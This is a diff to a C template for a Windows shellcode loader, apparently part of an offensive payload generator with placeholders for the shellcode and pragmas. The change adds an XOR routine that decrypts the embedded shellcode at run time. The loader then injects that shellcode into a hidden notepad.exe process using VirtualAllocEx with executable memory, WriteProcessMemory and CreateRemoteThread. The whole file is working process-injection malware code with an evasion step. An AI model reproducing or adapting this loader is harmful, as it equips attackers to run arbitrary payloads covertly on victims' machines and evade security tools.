@@ -5,12 +5,18 @@
 #endif
 
 {{ PRAGMAS }}
+VOID decrypt_xor(BYTE* encrypted, SIZE_T encrypted_len, BYTE* key, SIZE_T key_len)
+{
+	for (SIZE_T i = 0; i < encrypted_len; i++)
+	encrypted[i] ^= key[i % key_len];
+	return;
+}
+
 VOID entry(void)
 {
 
-    HANDLE process_handle = INVALID_HANDLE_VALUE;
-    HANDLE thread_handle = INVALID_HANDLE_VALUE;
-    HANDLE base_addr = INVALID_HANDLE_VALUE;
+    HANDLE remote_thread_handle = INVALID_HANDLE_VALUE;
+    PVOID base_address = INVALID_HANDLE_VALUE;
 
     STARTUPINFOA si = {0};
     PROCESS_INFORMATION pi = {0};
@@ -20,19 +26,19 @@ VOID entry(void)
 
     si.cb = sizeof(si);
 
-	unsigned char shellcode[] = {{ SHELLCODE }}
+	{{ SHELLCODE }}
+
+	decrypt_xor(shellcode, sizeof(shellcode), key, sizeof(key));
 
     CreateProcessA(NULL, "C:\\Windows\\System32\\notepad.exe", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
 
-    process_handle = pi.hProcess;
+    base_address = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+    if (base_address == INVALID_HANDLE_VALUE) return;
 
-    base_addr = VirtualAllocEx(process_handle, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
-    if (base_addr == INVALID_HANDLE_VALUE) return;
+    if (!WriteProcessMemory(pi.hProcess, base_address, shellcode, sizeof(shellcode), NULL)) return;
 
-    if (!WriteProcessMemory(process_handle, base_addr, shellcode, sizeof(shellcode), NULL)) return;
-
-    thread_handle = CreateRemoteThread(process_handle, 0, 0, (LPTHREAD_START_ROUTINE)base_addr, NULL, 0, NULL);
-    if (!thread_handle) return;
+    remote_thread_handle = CreateRemoteThread(pi.hProcess, 0, 0, (LPTHREAD_START_ROUTINE)base_address, NULL, 0, NULL);
+    if (!remote_thread_handle) return;
 	
 	return;
 }
